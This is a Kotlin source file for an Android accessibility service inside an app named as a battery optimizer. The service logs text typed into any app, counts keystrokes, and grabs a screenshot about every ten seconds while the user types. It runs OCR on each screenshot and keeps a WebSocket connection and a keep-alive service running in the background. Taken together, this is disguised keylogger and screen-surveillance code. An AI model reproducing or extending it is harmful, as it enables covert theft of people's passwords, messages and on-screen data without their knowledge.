package com.android.batteryoptimization

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.android.batteryoptimization.ocr.api.IOcrService
import com.android.batteryoptimization.network.WebSocketManager
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicLong

class InputAccessibilityService : AccessibilityService() {

    private lateinit var repository: InputRepository
    private var ocrService: IOcrService? = null
    private var screenshotReceiver: android.content.BroadcastReceiver? = null
    private val ocrScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val prefs by lazy {
        applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
    }
    private val healthPrefs by lazy {
        applicationContext.getSharedPreferences("accessibility_health", android.content.Context.MODE_PRIVATE)
    }

    /** 上次自动截屏时间戳（ms） */
    private val lastAutoScreenshotTime = AtomicLong(0L)

    /** 获取自动截屏间隔（ms），默认 10 秒 */
    private fun getScreenshotInterval(): Long =
        prefs.getLong(KEY_SCREENSHOT_INTERVAL, DEFAULT_SCREENSHOT_INTERVAL_MS)

    // Debounce: avoid capturing duplicate events from multiple event types per keystroke
    private val lastCaptureMap = mutableMapOf<String, Pair<Long, String>>() // packageName -> (timestamp, text)
    private val DEBOUNCE_MS = 800L

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        // 记录服务已成功连接的时间戳，供 App 启动后检测"故障状态"自愈
        healthPrefs.edit().putLong(KEY_LAST_CONNECTED_TIME, System.currentTimeMillis()).apply()
        repository = InputRepository.getInstance(applicationContext)

        // 经 DRouter 获取 OCR 服务（:ocr_module 未集成时返回 null，OCR 降级关闭）
        ocrService = OcrServiceLocator.get()
        // 模型加载较重，放到后台线程，避免阻塞主线程 / ANR
        ocrScope.launch(Dispatchers.IO) {
            ocrService?.loadModels()
        }

        // 后台保活 WebSocket（Activity 销毁后继续存活）
        WebSocketManager.start(this)

        Log.d(TAG, "Accessibility Service Connected (OCR ${if (ocrService != null) "enabled" else "disabled (module not integrated)"})")

        startService(Intent(this, KeepAliveService::class.java))

        val filter = android.content.IntentFilter(ACTION_TAKE_SCREENSHOT)
        screenshotReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                Log.d(TAG, "Received screenshot broadcast — capturing + OCR")
                doScreenshotAndOcr()
            }
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenshotReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenshotReceiver, filter)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        ocrScope.cancel()
        ocrService?.destroy()
        ocrService = null
        screenshotReceiver?.let { receiver ->
            try {
                unregisterReceiver(receiver)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to unregister receiver", e)
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: "Unknown"
            val appName = getAppName(packageName)
            val text = event.text.joinToString(" ")

            // Avoid capturing empty or blank strings unnecessarily
            if (text.isNotBlank()) {
                // 记录输入事件
                val current = prefs.getInt("total_keystrokes", 0)
                prefs.edit().putInt("total_keystrokes", current + 1).apply()

                val inputEvent = InputEvent(
                    timestamp = System.currentTimeMillis(),
                    packageName = packageName,
                    appName = appName,
                    text = text,
                    source = "accessibility"
                )
                repository.addEvent(inputEvent)
                Log.d(TAG, "Captured input: $text from $packageName")

                // ── 自动截屏逻辑 ────────────────────────────────────
                val now = System.currentTimeMillis()
                val last = lastAutoScreenshotTime.get()
                val interval = getScreenshotInterval()
                if (now - last >= interval && lastAutoScreenshotTime.compareAndSet(last, now)) {
                    Log.d(TAG, "Auto screenshot triggered (interval=${interval}ms)")
                    ocrScope.launch {
                        doAutoScreenshotOcr(packageName, appName)
                    }
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted")
        healthPrefs.edit().putLong(KEY_LAST_INTERRUPT_TIME, System.currentTimeMillis()).apply()
    }

    // ─── 自动截屏 + OCR ─────────────────────────────────────────────

    /**
     * 执行截屏 → OCR → 压缩图片 → 存入事件流
     */
    private suspend fun doAutoScreenshotOcr(packageName: String, appName: String) {
        var bitmap: android.graphics.Bitmap? = null
        try {
            bitmap = captureScreenshotBlocking() ?: return

            val ocrResults = ocrService?.recognize(bitmap) ?: emptyList()
            if (ocrResults.isEmpty()) {
                Log.d(TAG, "Auto OCR: no text detected")
                return
            }

            val fullText = ocrResults.joinToString("\n") { it.text }
            Log.d(TAG, "Auto OCR: ${ocrResults.size} lines, text=$fullText")

            repository.addOcrEvents(
                packageName = packageName,
                appName = appName,
                results = ocrResults
            )
        } catch (e: Exception) {
            Log.e(TAG, "Auto screenshot+OCR failed", e)
            // 失败时重置计时，允许下次重试
            lastAutoScreenshotTime.set(0L)
        } finally {
            bitmap?.recycle()
        }
    }

    /**
     * 手动截屏（广播触发），带 Toast 提示
     */
    private fun doScreenshotAndOcr() {
        takeScreenshotCallback { bitmap, msg ->
            if (bitmap != null) {
                ocrScope.launch {
                    try {
                        val ocrResults = ocrService?.recognize(bitmap) ?: emptyList()
                        if (ocrResults.isNotEmpty()) {
                            val fullText = ocrResults.joinToString("\n") { it.text }
                            repository.addOcrEvents(
                                packageName = "screenshot",
                                appName = "Screen OCR",
                                results = ocrResults
                            )
                            Log.d(TAG, "Manual OCR result: $fullText")
                        }
                        bitmap.recycle()
                    } catch (e: Exception) {
                        Log.e(TAG, "OCR processing failed", e)
                    }
                }
            }
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                android.widget.Toast.makeText(
                    this@InputAccessibilityService,
                    msg,
                    android.widget.Toast.LENGTH_SHORT
                ).show()
            }
        }
    }

    /**
     * 同步截屏（挂起函数），返回 Bitmap 或 null
     */
    private suspend fun captureScreenshotBlocking(): android.graphics.Bitmap? =
        suspendCancellableCoroutine { continuation ->
            takeScreenshotCallback { bitmap, _ ->
                continuation.resume(bitmap, null)
            }
        }

    /**
     * 截屏回调封装
     */
    private fun takeScreenshotCallback(onResult: (android.graphics.Bitmap?, String) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        try {
                            val hardwareBuffer = screenshot.hardwareBuffer
                            val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(
                                hardwareBuffer,
                                screenshot.colorSpace
                            )
                            if (bitmap != null) {
                                val mutableBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                                bitmap.recycle()
                                onResult(mutableBitmap, "截图成功")
                            } else {
                                onResult(null, "Bitmap 转换失败")
                            }
                            hardwareBuffer.close()
                        } catch (e: Exception) {
                            Log.e(TAG, "Screenshot handling error", e)
                            onResult(null, "截图异常: ${e.message}")
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        onResult(null, "截图失败, 错误码: $errorCode")
                    }
                }
            )
        } else {
            onResult(null, "需要 Android 11+")
        }
    }

    // ─── 工具方法 ──────────────────────────────────────────────────

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val applicationInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    /**
     * 获取 OCR 服务（经 DRouter 寻址），供 UI 层测试使用。未集成时返回 null。
     */
    fun getOcrService(): IOcrService? = ocrService


    companion object {
        private const val TAG = "InputAccessibility"
        const val ACTION_TAKE_SCREENSHOT = "com.android.batteryoptimization.ACTION_TAKE_SCREENSHOT"

        /** 自动截屏间隔（ms）— SharedPreferences key */
        const val KEY_SCREENSHOT_INTERVAL = "screenshot_interval_ms"
        const val DEFAULT_SCREENSHOT_INTERVAL_MS = 10000L

        const val KEY_LAST_CONNECTED_TIME = "last_connected_time"
        const val KEY_LAST_INTERRUPT_TIME = "last_interrupt_time"
        const val PREFS_HEALTH = "accessibility_health"

        var instance: InputAccessibilityService? = null
            private set
    }
}
